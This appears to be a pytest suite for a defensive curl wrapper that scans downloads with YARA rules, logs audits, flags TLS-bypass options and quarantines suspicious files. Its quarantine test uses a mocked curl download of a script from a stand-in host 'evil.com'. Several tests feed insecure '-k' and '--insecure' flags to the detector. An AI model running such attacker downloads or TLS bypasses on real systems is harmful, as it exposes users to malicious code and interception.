import pytest
import subprocess
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch
import sys
import os

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from curlguard.config import CurlGuardConfig, load_config
from curlguard.scanner import YaraScanner, ScanResult
from curlguard.logger import AuditLogger, AuditEvent
from curlguard.ssl_detector import SslBypassDetector, SslBypassResult
from curlguard.wrapper import CurlWrapper
from curlguard.curl_manager import CurlManager


@pytest.fixture
def temp_config(tmp_path):
    config = CurlGuardConfig(
        mode="per-user",
        log_path=tmp_path / "audit.log",
        rules_dirs=[tmp_path / "rules"],
        quarantine_dir=tmp_path / "quarantine",
        real_curl_path=Path("/usr/bin/curl"),
    )
    config.quarantine_dir.mkdir(parents=True, exist_ok=True)
    return config


@pytest.fixture
def mock_scanner():
    scanner = MagicMock(spec=YaraScanner)
    scanner.scan_file.return_value = ScanResult(
        clean=True, matches=[], rules_triggered=[], scan_time_ms=1.0
    )
    scanner.scan.return_value = ScanResult(
        clean=True, matches=[], rules_triggered=[], scan_time_ms=1.0
    )
    return scanner


@pytest.fixture
def mock_logger(temp_config):
    return AuditLogger(temp_config.log_path)


@pytest.fixture
def mock_ssl_detector():
    detector = MagicMock(spec=SslBypassDetector)
    detector.detect.return_value = SslBypassResult(
        is_bypass=False, bypass_type=None, severity="warning", message=""
    )
    return detector


class TestScanner:
    def test_scanner_clean_content(self):
        scanner = YaraScanner([])
        result = scanner.scan(b"#!/bin/bash\necho hello")
        assert result.clean is True
        assert isinstance(result, ScanResult)

    def test_scanner_foundation_rules_loaded(self):
        rules_dir = Path(__file__).parent.parent / "src" / "curlguard" / "rules"
        if rules_dir.exists():
            scanner = YaraScanner([rules_dir])
            assert scanner._rules_count >= 0

    def test_scanresult_fields(self):
        result = ScanResult(
            clean=False,
            matches=["rule1"],
            rules_triggered=["rule1"],
            scan_time_ms=5.5,
        )
        assert result.clean is False
        assert "rule1" in result.rules_triggered


class TestConfig:
    def test_config_creation(self, temp_config):
        assert temp_config.mode == "per-user"
        assert temp_config.quarantine_dir.exists()

    def test_config_env_override(self, temp_config, monkeypatch):
        monkeypatch.setenv("CURLGUARD_LOG_PATH", "/tmp/override.log")
        monkeypatch.setenv("CURLGUARD_MODE", "per-user")
        config = load_config()
        assert str(config.log_path) == "/tmp/override.log"


class TestLogger:
    def test_logger_writes_json(self, mock_logger):
        event = AuditEvent(
            timestamp="2024-01-01T00:00:00",
            url="https://example.com/file.sh",
            destination="/tmp/out.sh",
            scan_result="clean",
            rules_triggered=[],
            user_decision=None,
            ssl_bypass_detected=False,
            duration_ms=100.0,
            exit_code=0,
        )
        mock_logger.log(event)
        mock_logger.close()
        with open(mock_logger._path) as f:
            line = f.readline()
        import json
        parsed = json.loads(line)
        assert parsed["url"] == "https://example.com/file.sh"
        assert parsed["scan_result"] == "clean"

    def test_logger_context_manager(self, temp_config):
        with AuditLogger(temp_config.log_path) as logger:
            logger.log(AuditEvent(
                timestamp="2024-01-01T00:00:00",
                url="https://test.com",
                destination=None,
                scan_result="clean",
            ))
        assert temp_config.log_path.exists()


class TestSslDetector:
    def test_detect_insecure_flag(self):
        detector = SslBypassDetector()
        result = detector.detect(["--insecure", "https://example.com"], "https://example.com")
        assert result.is_bypass is True
        assert result.bypass_type == "flag"

    def test_detect_k_flag(self):
        detector = SslBypassDetector()
        result = detector.detect(["-k", "https://example.com"], "https://example.com")
        assert result.is_bypass is True
        assert result.bypass_type == "flag"

    def test_detect_clean(self):
        detector = SslBypassDetector()
        result = detector.detect(["https://example.com"], "https://example.com")
        assert result.is_bypass is False

    def test_detect_http_url(self):
        detector = SslBypassDetector()
        result = detector.detect(["http://example.com/file.sh"], "http://example.com/file.sh")
        assert result.is_bypass is True
        assert result.bypass_type == "mixed"


class TestCurlManager:
    def test_manager_per_user_paths(self):
        manager = CurlManager("per-user")
        assert ".local/bin" in str(manager._curl_path)
        assert ".local/bin/curl.real" in str(manager._curl_real)

    def test_manager_system_wide_paths(self):
        manager = CurlManager("system-wide")
        assert str(manager._curl_path) == "/usr/bin/curl"
        assert str(manager._curl_real) == "/usr/bin/curl.real"


class TestWrapper:
    def test_extract_url(self, temp_config, mock_scanner, mock_logger, mock_ssl_detector):
        wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
        url = wrapper._extract_url(["https://example.com/file.sh"])
        assert url == "https://example.com/file.sh"

    def test_extract_output_file(self, temp_config, mock_scanner, mock_logger, mock_ssl_detector):
        wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
        out = wrapper._extract_output(["-o", "/tmp/out.sh", "https://example.com"])
        assert out == "/tmp/out.sh"

    def test_ssl_bypass_propagates(self, temp_config, mock_scanner, mock_logger, mock_ssl_detector):
        mock_ssl_detector.detect.return_value = SslBypassResult(
            is_bypass=True, bypass_type="flag", severity="warning",
            message="SSL bypass detected"
        )
        wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
        # Just verify no crash on SSL bypass detection path
        result = mock_ssl_detector.detect(["--insecure"], "https://example.com")
        assert result.is_bypass is True


class TestIntegration:
    def test_full_dispatch_flow(self, temp_config, mock_logger, mock_ssl_detector, monkeypatch):
        mock_scanner = MagicMock()
        mock_scanner.scan_file.return_value = ScanResult(
            clean=True, matches=[], rules_triggered=[], scan_time_ms=2.0
        )
        wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
        temp_file = temp_config.quarantine_dir / "test.download"
        temp_file.touch()
        def mock_mktemp(suffix=""):
            return str(temp_file)
        with patch("curlguard.wrapper.subprocess.run") as mock_run, \
             patch("tempfile.mktemp", mock_mktemp):
            mock_run.return_value = MagicMock(returncode=0)
            exit_code = wrapper.dispatch(["https://example.com/file.sh", "-o", str(temp_config.quarantine_dir / "out.sh")])
            mock_scanner.scan_file.assert_called_once()

    def test_quarantine_decision(self, temp_config, mock_logger, mock_ssl_detector, monkeypatch):
        mock_scanner = MagicMock()
        mock_scanner.scan_file.return_value = ScanResult(
            clean=False, matches=["malware"], rules_triggered=["malware"], scan_time_ms=1.0
        )
        wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
        temp_file = temp_config.quarantine_dir / "malware.download"
        temp_file.touch()
        def mock_mktemp(suffix=""):
            return str(temp_file)
        with patch("curlguard.wrapper.subprocess.run") as mock_run, \
             patch("tempfile.mktemp", mock_mktemp), \
             patch("curlguard.tui.prompt_user", return_value="quarantine"):
            mock_run.return_value = MagicMock(returncode=0)
            exit_code = wrapper.dispatch(["https://evil.com/malware.sh", "-o", "/tmp/malware.sh"])
            assert exit_code == 1